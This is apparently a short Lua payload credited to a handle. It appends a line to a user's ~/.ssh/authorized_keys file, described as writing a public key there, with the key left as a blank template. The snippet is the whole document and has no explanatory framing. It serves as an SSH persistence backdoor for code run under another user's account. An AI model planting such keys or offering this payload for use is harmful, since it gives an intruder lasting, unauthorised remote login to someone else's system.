-- write public key to the authorized_keys of a user.
-- by @deathflash1411
local file = io.open("/home/username/.ssh/authorized_keys", "a")
file:write("\n \n")
file:close()  
